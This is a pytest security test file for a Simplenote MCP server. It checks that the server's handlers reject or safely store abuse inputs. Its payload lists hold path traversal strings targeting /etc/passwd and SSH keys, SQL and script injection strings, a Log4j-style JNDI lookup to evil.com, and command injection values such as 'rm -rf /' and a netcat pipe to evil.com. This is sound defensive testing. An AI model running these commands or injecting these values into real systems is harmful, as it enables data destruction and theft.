"""Authorization boundary and abuse case tests for security validation."""

import asyncio
import json
import time
from unittest.mock import patch

import pytest

from simplenote_mcp.server.errors import (
    AuthenticationError,
    SecurityError,
    ValidationError,
)
from simplenote_mcp.server.server import (
    handle_call_tool,
    handle_list_resources,
    handle_read_resource,
)


class TestAuthorizationBoundaries:
    """Test authorization boundaries and access controls."""

    def setup_method(self):
        """Reset global server state before each test for isolation."""
        import simplenote_mcp.server.server as srv

        srv.simplenote_client = None
        srv.note_cache = None

    def teardown_method(self):
        """Reset global server state after each test."""
        import simplenote_mcp.server.server as srv

        srv.simplenote_client = None
        srv.note_cache = None

    @pytest.mark.asyncio
    async def test_unauthenticated_access_prevention(self):
        """Test that unauthenticated access is prevented."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.side_effect = AuthenticationError("No credentials")

            # Should raise authentication error or return empty result for any operation
            try:
                result = await handle_list_resources()
                # If no exception, should return empty resources (graceful handling)
                resources = result.resources if hasattr(result, "resources") else result
                assert (
                    len(resources) == 0
                )  # Should return empty list when unauthenticated
            except AuthenticationError:
                # Also acceptable to raise authentication error
                pass

            with pytest.raises((AuthenticationError, Exception)):
                await handle_read_resource("simplenote://note/test")

    @pytest.mark.asyncio
    async def test_invalid_resource_access(self):
        """Test access to invalid or malformed resources."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.get_note.return_value = (None, 1)  # Not found

            # Test various malformed URIs
            invalid_uris = [
                "invalid://not-supported",
                "simplenote://invalid/path",
                "simplenote://note/../../../etc/passwd",
                "simplenote://note/\x00\x01\x02",
                "simplenote://note/" + "x" * 10000,  # Extremely long ID
                "javascript:alert('xss')",
                "data:text/html,<script>alert('xss')</script>",
            ]

            for uri in invalid_uris:
                with pytest.raises((ValidationError, Exception)):
                    await handle_read_resource(uri)

    @pytest.mark.asyncio
    async def test_tool_parameter_validation_boundaries(self):
        """Test tool parameter validation at boundaries."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.add_note.return_value = (
                {"key": "test_key", "content": "test"},
                0,
            )  # Proper mock response
            # Test extremely large content
            large_content = "x" * (1024 * 1024 * 10)  # 10MB

            with pytest.raises((ValidationError, Exception)):
                await handle_call_tool("create_note", {"content": large_content})

            # Test content with null bytes
            try:
                result = await handle_call_tool(
                    "create_note", {"content": "test\x00content"}
                )
                # If it succeeds, null bytes are now allowed (updated security policy)
                assert result is not None
            except (ValidationError, SecurityError):
                # If it fails, security/validation caught it (also acceptable)
                pass

            # Test extremely long tag names
            long_tag = "x" * 1000
            with pytest.raises((ValidationError, Exception)):
                await handle_call_tool(
                    "create_note", {"content": "test", "tags": [long_tag]}
                )

            # Test excessive number of tags
            many_tags = [f"tag{i}" for i in range(1000)]
            with pytest.raises((ValidationError, Exception)):
                await handle_call_tool(
                    "create_note", {"content": "test", "tags": many_tags}
                )

    @pytest.mark.asyncio
    async def test_unicode_and_encoding_boundaries(self):
        """Test handling of various Unicode and encoding edge cases."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.add_note.return_value = ({}, 0)

            # Test various Unicode edge cases
            unicode_tests = [
                "🚀 Rocket emoji",
                "測試中文內容",  # Chinese
                "Тест на русском",  # Russian
                "العربية",  # Arabic
                "\u200b\u200c\u200d",  # Zero-width characters
                "\ufeff",  # Byte order mark
                "𝕋𝕖𝕤𝕥",  # Mathematical symbols
                "\x00\x01\x1f",  # Control characters
            ]

            for test_content in unicode_tests:
                try:
                    await handle_call_tool("create_note", {"content": test_content})
                except (ValidationError, UnicodeError):
                    # Expected for invalid characters
                    pass

    @pytest.mark.asyncio
    async def test_sql_injection_attempts(self):
        """Test resistance to SQL injection attempts."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.add_note.return_value = ({}, 0)

            # Common SQL injection patterns
            sql_injection_patterns = [
                "'; DROP TABLE notes; --",
                "1' OR '1'='1",
                "admin'/*",
                "' UNION SELECT * FROM users --",
                '"; DELETE FROM notes; --',
                "1; EXEC xp_cmdshell('dir'); --",
            ]

            for pattern in sql_injection_patterns:
                # Should not cause any SQL-related errors (we don't use SQL directly)
                # But should be safely handled
                try:
                    await handle_call_tool(
                        "create_note", {"content": pattern, "tags": [pattern]}
                    )
                except (ValidationError, SecurityError):
                    # Expected if input validation or security validation catches it
                    pass

    @pytest.mark.asyncio
    async def test_script_injection_attempts(self):
        """Test resistance to script injection attempts."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.add_note.return_value = ({}, 0)

            # Script injection patterns
            script_patterns = [
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "<img src=x onerror=alert('xss')>",
                "${jndi:ldap://evil.com/payload}",  # Log4j-style
                "{{constructor.constructor('alert(1)')()}}",  # Template injection
                "$(echo 'command injection')",
                "`whoami`",
                "eval('malicious code')",
            ]

            for pattern in script_patterns:
                try:
                    await handle_call_tool(
                        "create_note", {"content": pattern, "tags": [pattern]}
                    )
                except (ValidationError, SecurityError):
                    # Expected if validation or security validation catches script patterns
                    pass

    @pytest.mark.asyncio
    async def test_path_traversal_attempts(self):
        """Test resistance to path traversal attempts."""
        # Test various path traversal patterns in note IDs
        traversal_patterns = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
            "/var/log/auth.log%00.txt",
        ]

        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.get_note.return_value = (None, 1)  # Not found

            for pattern in traversal_patterns:
                with pytest.raises((ValidationError, Exception)):
                    await handle_read_resource(f"simplenote://note/{pattern}")


class TestRateLimitingAndAbuse:
    """Test rate limiting and abuse prevention mechanisms."""

    def setup_method(self):
        import simplenote_mcp.server.server as srv

        srv.simplenote_client = None
        srv.note_cache = None

    def teardown_method(self):
        import simplenote_mcp.server.server as srv

        srv.simplenote_client = None
        srv.note_cache = None

    @pytest.mark.asyncio
    async def test_rapid_request_rate_limiting(self):
        """Test rate limiting under rapid requests."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.get_note_list.return_value = ([], 0)

            # Make rapid requests
            request_count = 100
            start_time = time.time()

            successful_requests = 0
            rate_limited_requests = 0

            for _i in range(request_count):
                try:
                    await handle_list_resources()
                    successful_requests += 1
                except Exception as e:
                    # Should eventually hit rate limits
                    if "rate limit" in str(e).lower():
                        rate_limited_requests += 1

            end_time = time.time()
            duration = end_time - start_time

            # Should complete quickly but have some rate limiting
            assert duration < 10  # Should not take too long
            # Note: Actual rate limiting behavior depends on implementation

    @pytest.mark.asyncio
    async def test_concurrent_request_flood(self):
        """Test handling of concurrent request floods."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.get_note_list.return_value = ([], 0)

            # Create many concurrent requests
            async def make_request():
                try:
                    return await handle_list_resources()
                except Exception as e:
                    return e

            # Launch concurrent requests
            tasks = [make_request() for _ in range(50)]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            # Should handle concurrent load gracefully
            successful_count = sum(1 for r in results if not isinstance(r, Exception))
            error_count = len(results) - successful_count

            # Should have some successful requests
            assert successful_count > 0
            # Errors are acceptable under high load
            print(
                f"Concurrent test: {successful_count} successful, {error_count} errors"
            )

    @pytest.mark.asyncio
    async def test_memory_exhaustion_prevention(self):
        """Test prevention of memory exhaustion attacks."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            # Create mock responses that could exhaust memory
            large_note = {"content": "x" * 1024 * 1024, "key": "large_note"}  # 1MB note
            mock_client.return_value.get_note_list.return_value = (
                [large_note] * 100,
                0,
            )  # 100MB total

            try:
                # Should handle large responses safely
                resources = await handle_list_resources()
                # Should either limit response size or handle gracefully
                assert len(resources) < 1000  # Reasonable limit
            except Exception as e:
                # Acceptable if it prevents memory exhaustion
                assert "memory" in str(e).lower() or "limit" in str(e).lower()

    @pytest.mark.asyncio
    async def test_infinite_loop_prevention(self):
        """Test prevention of infinite loops in processing."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            # Create circular reference or infinite data structure
            circular_note = {
                "content": "circular reference test",
                "key": "circular",
                "tags": ["self-reference"] * 1000,  # Large repetitive data
            }
            mock_client.return_value.get_note.return_value = (circular_note, 0)

            # Should handle without infinite loops
            start_time = time.time()
            try:
                await handle_read_resource("simplenote://note/circular")
            except Exception:
                pass  # Error is acceptable

            duration = time.time() - start_time
            assert duration < 5  # Should not hang


class TestInputSanitization:
    """Test input sanitization and validation."""

    def setup_method(self):
        import simplenote_mcp.server.server as srv

        srv.simplenote_client = None
        srv.note_cache = None

    def teardown_method(self):
        import simplenote_mcp.server.server as srv

        srv.simplenote_client = None
        srv.note_cache = None

    @pytest.mark.asyncio
    async def test_malformed_json_handling(self):
        """Test handling of malformed JSON in tool calls."""
        with patch("simplenote_mcp.server.server.get_simplenote_client"):
            # Test various malformed JSON scenarios
            malformed_inputs = [
                '{"incomplete": ',
                '{"unclosed_string": "value',
                '{"invalid_escape": "\\x"}',
                '{"trailing_comma": "value",}',
                '{"duplicate_key": 1, "duplicate_key": 2}',
                '{"deeply": {"nested": {"object": {"too": {"deep": 1}}}}}',  # Very deep nesting
            ]

            # These should be caught at the MCP protocol level, but test graceful handling
            for _malformed_json in malformed_inputs:
                try:
                    # Direct JSON parsing would fail, but our tool handlers should be robust
                    test_data = json.loads('{"content": "test"}')  # Valid fallback
                    await handle_call_tool("create_note", test_data)
                except (json.JSONDecodeError, ValidationError, SecurityError):
                    # Expected for malformed input or security validation
                    pass

    @pytest.mark.asyncio
    async def test_binary_data_handling(self):
        """Test handling of binary data in text fields."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.add_note.return_value = ({}, 0)

            # Test binary data patterns
            binary_patterns = [
                b"\x89PNG\r\n\x1a\n",  # PNG header
                b"\xff\xd8\xff\xe0",  # JPEG header
                b"\x00\x01\x02\x03",  # Raw binary
                bytes(range(256)),  # All byte values
            ]

            for binary_data in binary_patterns:
                try:
                    # Convert to string representation
                    content = str(binary_data)
                    await handle_call_tool("create_note", {"content": content})
                except (ValidationError, UnicodeDecodeError, SecurityError):
                    # Expected for binary data or security validation
                    pass

    @pytest.mark.asyncio
    async def test_special_character_boundaries(self):
        """Test handling of special characters at boundaries."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.add_note.return_value = ({}, 0)

            # Test special characters that might break parsing
            special_chars = [
                "\r\n\r\n",  # CRLF sequences
                "\t\t\t",  # Multiple tabs
                "   ",  # Only spaces
                "",  # Empty string
                "\u0000",  # Null character
                "\u001f",  # Unit separator
                "\ufeff",  # Byte order mark
                "\u2028",  # Line separator
                "\u2029",  # Paragraph separator
            ]

            for char in special_chars:
                try:
                    await handle_call_tool(
                        "create_note", {"content": f"test{char}content"}
                    )
                except (ValidationError, SecurityError):
                    # Expected for invalid characters or security validation
                    pass


class TestPrivilegeEscalation:
    """Test resistance to privilege escalation attempts."""

    def setup_method(self):
        """Reset global server state before each test for isolation."""
        import simplenote_mcp.server.server as srv

        srv.simplenote_client = None
        srv.note_cache = None

    def teardown_method(self):
        """Reset global server state after each test."""
        import simplenote_mcp.server.server as srv

        srv.simplenote_client = None
        srv.note_cache = None

    @pytest.mark.asyncio
    async def test_environment_variable_access(self):
        """Test that environment variables cannot be accessed."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.add_note.return_value = ({}, 0)

            # Attempt to access environment variables through content
            env_access_patterns = [
                "${HOME}",
                "$HOME",
                "%USERPROFILE%",
                "#{ENV['PATH']}",
                "{{env.HOME}}",
                "${env:PATH}",
            ]

            for pattern in env_access_patterns:
                # Should not expand environment variables
                await handle_call_tool(
                    "create_note", {"content": f"Trying to access: {pattern}"}
                )
                # Content should remain literal, not expanded

    @pytest.mark.asyncio
    async def test_system_command_injection(self):
        """Test resistance to system command injection."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.add_note.return_value = ({}, 0)

            # Command injection patterns
            command_patterns = [
                "; ls -la",
                "| cat /etc/passwd",
                "&& whoami",
                "$(id)",
                "`ps aux`",
                "; rm -rf /",
                "| nc evil.com 1234",
            ]

            for pattern in command_patterns:
                # Should not execute commands
                try:
                    await handle_call_tool(
                        "create_note", {"content": f"Content with command: {pattern}"}
                    )
                    # Should be treated as literal text
                except SecurityError:
                    # Expected for dangerous command patterns
                    pass

    @pytest.mark.asyncio
    async def test_file_system_access_attempts(self):
        """Test resistance to file system access attempts."""
        # Test attempts to access files through note IDs or content
        file_access_patterns = [
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM",
            "/proc/self/environ",
            "/dev/urandom",
            "~/.ssh/id_rsa",
            "/var/log/syslog",
        ]

        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.get_note.return_value = (None, 1)  # Not found

            for pattern in file_access_patterns:
                with pytest.raises((ValidationError, Exception)):
                    await handle_read_resource(f"simplenote://note/{pattern}")


class TestResourceExhaustion:
    """Test resistance to resource exhaustion attacks."""

    def setup_method(self):
        import simplenote_mcp.server.server as srv

        srv.simplenote_client = None
        srv.note_cache = None

    def teardown_method(self):
        import simplenote_mcp.server.server as srv

        srv.simplenote_client = None
        srv.note_cache = None

    @pytest.mark.asyncio
    async def test_cpu_exhaustion_prevention(self):
        """Test prevention of CPU exhaustion."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            # Create content designed to cause high CPU usage
            cpu_intensive_content = {
                "content": "A" * 1000
                + "B" * 1000
                + "C" * 1000,  # Large repetitive content
                "tags": [f"tag_{i}" for i in range(100)],  # Many tags for processing
            }
            mock_client.return_value.add_note.return_value = ({}, 0)

            # Should complete within reasonable time or be limited by validation
            start_time = time.time()
            try:
                await handle_call_tool("create_note", cpu_intensive_content)
                duration = time.time() - start_time
                assert duration < 2  # Should not take too long
            except ValidationError as e:
                # Expected if tag count exceeds limits (50 max)
                assert "Tag Count" in str(e)
                duration = time.time() - start_time
                assert duration < 2  # Should fail quickly due to validation

    @pytest.mark.asyncio
    async def test_nested_structure_limits(self):
        """Test limits on deeply nested structures."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.add_note.return_value = ({}, 0)

            # Create deeply nested tag structure (if supported)
            nested_tags = []
            current = ""
            for i in range(100):  # Deep nesting
                current += f"level{i}/"
                nested_tags.append(current)

            try:
                await handle_call_tool(
                    "create_note",
                    {"content": "Nested structure test", "tags": nested_tags},
                )
            except (ValidationError, RecursionError, SecurityError):
                # Expected for overly nested structures or security validation
                pass

    @pytest.mark.asyncio
    async def test_regex_dos_prevention(self):
        """Test prevention of ReDoS (Regular Expression Denial of Service)."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.add_note.return_value = ({}, 0)

            # Patterns that could cause ReDoS
            redos_patterns = [
                "a" * 1000 + "X",  # Catastrophic backtracking potential
                "(" * 100 + "a" + ")" * 100,  # Complex grouping
                "[a-zA-Z0-9]" * 100,  # Complex character classes
            ]

            for pattern in redos_patterns:
                start_time = time.time()
                try:
                    await handle_call_tool(
                        "create_note", {"content": f"Pattern test: {pattern}"}
                    )
                except Exception:
                    pass  # Errors are acceptable

                duration = time.time() - start_time
                assert duration < 1  # Should not cause timeout


class TestSecurityHeaders:
    """Test security-related metadata and headers."""

    def setup_method(self):
        """Reset global server state before each test for isolation."""
        import simplenote_mcp.server.server as srv

        srv.simplenote_client = None
        srv.note_cache = None

    def teardown_method(self):
        """Reset global server state after each test."""
        import simplenote_mcp.server.server as srv

        srv.simplenote_client = None
        srv.note_cache = None

    @pytest.mark.asyncio
    async def test_sensitive_data_exposure(self):
        """Test that sensitive data is not exposed in responses."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            # Create note with potentially sensitive patterns
            mock_note = {
                "content": "Password: secret123\nAPI Key: abc-def-ghi\nSSN: 123-45-6789",
                "key": "sensitive_note",
            }
            mock_client.return_value.get_note.return_value = (mock_note, 0)

            # Should return the content as-is (it's the user's data)
            # But should not expose internal system information
            resource = await handle_read_resource("simplenote://note/sensitive_note")

            # Should not contain internal paths, tokens, or system info
            content = str(resource)
            assert "/tmp/" not in content
            assert "token" not in content.lower()
            assert (
                "secret" not in content.lower() or "secret123" in content
            )  # User data is OK

    @pytest.mark.asyncio
    async def test_information_disclosure_prevention(self):
        """Test prevention of information disclosure through errors."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.side_effect = Exception(
                "Internal database error: /var/lib/db/notes.db"
            )

            # Errors should not expose internal paths or system information
            try:
                await handle_list_resources()
            except Exception as e:
                error_msg = str(e)
                # Should not contain internal paths
                assert "/var/lib/" not in error_msg
                assert ".db" not in error_msg
                # Should be a generic error message


class TestSecurityMonitoring:
    """Test security monitoring and alerting."""

    def setup_method(self):
        import simplenote_mcp.server.server as srv

        srv.simplenote_client = None
        srv.note_cache = None

    def teardown_method(self):
        import simplenote_mcp.server.server as srv

        srv.simplenote_client = None
        srv.note_cache = None

    @pytest.mark.asyncio
    async def test_suspicious_activity_logging(self):
        """Test that suspicious activities are logged."""
        with (
            patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client,
            patch("simplenote_mcp.server.logging.logger"),
        ):
            mock_client.return_value.add_note.return_value = ({}, 0)

            # Perform suspicious activities
            suspicious_content = "<script>alert('xss')</script>"

            try:
                await handle_call_tool("create_note", {"content": suspicious_content})
            except (SecurityError, Exception):
                # Expected for suspicious content or rate limiting
                pass

            # Should log security-related events
            # (This depends on actual security monitoring implementation)
            # For now, just ensure no crashes occur

    @pytest.mark.asyncio
    async def test_abuse_pattern_detection(self):
        """Test detection of abuse patterns."""
        with patch("simplenote_mcp.server.server.get_simplenote_client") as mock_client:
            mock_client.return_value.add_note.return_value = ({}, 0)

            # Simulate abuse patterns - rapid identical requests
            for _i in range(10):
                try:
                    await handle_call_tool("create_note", {"content": "Spam content"})
                except (SecurityError, Exception) as e:
                    # Expected for abuse pattern detection or rate limiting
                    if "Rate limit" in str(e):
                        break  # Stop when rate limited
                    continue  # Continue testing abuse detection

            # Should handle gracefully without crashing
            # Actual abuse detection would depend on implementation


# Mark all tests as security-related for categorization
pytestmark = [pytest.mark.unit, pytest.mark.security]
